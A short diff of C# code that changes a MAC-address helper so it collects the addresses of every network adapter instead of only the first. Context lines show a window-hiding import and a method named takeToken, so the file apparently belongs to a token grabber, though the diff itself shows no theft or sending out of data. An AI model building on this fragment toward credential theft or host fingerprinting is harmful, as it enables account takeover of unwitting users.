@@ -117,21 +117,17 @@ namespace basicst
         private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
 
 
-        public static string GetMACAddress()
-        {
-            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
-            String sMacAddress = string.Empty;
-            foreach (NetworkInterface adapter in nics)
-            {
-                if (sMacAddress == String.Empty)
-                {
-                    IPInterfaceProperties properties = adapter.GetIPProperties();
-                    sMacAddress = adapter.GetPhysicalAddress().ToString();
-                }
-            }
-            string macadressgrabber = sMacAddress;
-            return macadressgrabber;
-        }
+                        public static string GetMacAddress()
+			{
+				string macAddresses1 = """";
+				foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
+				{
+					macAddresses1 += ""\n"";
+					macAddresses1 += nic.GetPhysicalAddress().ToString();
+				}
+				return macAddresses1;
+			}
+
 
 
         public static string takeToken()
